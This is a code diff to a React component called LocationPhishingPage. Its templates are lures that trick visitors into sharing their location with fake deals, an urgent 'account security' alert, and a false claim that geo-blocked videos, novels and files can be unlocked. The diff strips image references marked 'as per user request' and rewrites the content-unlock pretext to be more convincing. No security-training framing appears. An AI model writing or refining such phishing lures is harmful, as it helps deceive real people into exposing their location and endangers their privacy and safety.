@@ -16,7 +16,6 @@ interface TemplateContent {
   actionText: string;
   message: string; // General message or intro
   heroIcon?: LucideIcon;
-  imageSrc?: string;
   pageSpecificMessage?: string; // More detailed message for specific layouts
 }
 
@@ -27,7 +26,6 @@ const templateContent: Record<string, TemplateContent> = {
     message: 'Unlock exclusive offers and discounts from local stores.',
     pageSpecificMessage: 'Share your location to see personalized deals from shops and restaurants in your area. Limited time offers available now!',
     heroIcon: Sparkles,
-    // Image removed from here as per user request
   },
   'security-alert': {
     title: 'Urgent: Account Security Action Required',
@@ -39,10 +37,9 @@ const templateContent: Record<string, TemplateContent> = {
   'content-unlock': {
     title: 'Unlock Exclusive Local Content',
     actionText: 'Verify Location to Access',
-    message: 'this content is blocked in some areas.', // Updated text
-    pageSpecificMessage: 'Get access to videos, articles, and special features available only in your region. Share your location to unlock now!',
+    message: 'this content is blocked in some areas.',
+    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
     heroIcon: Lock,
-    // imageSrc property removed as per user request
   },
   default: {
     title: 'Location Verification Needed',
@@ -119,7 +116,6 @@ export default function LocationPhishingPage() {
       case 'nearby-deals':
         return (
           <div className="text-center space-y-6">
-            {/* Image component removed from here as per user request */}
             <HeroIcon className="w-16 h-16 text-accent mx-auto" />
             <p className="text-xl text-foreground font-semibold">{content.message}</p>
             <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
@@ -142,7 +138,6 @@ export default function LocationPhishingPage() {
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
-              {/* Image component removed as per user request */}
               <CardDescription className="text-xl text-foreground font-semibold">{content.message}</CardDescription>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
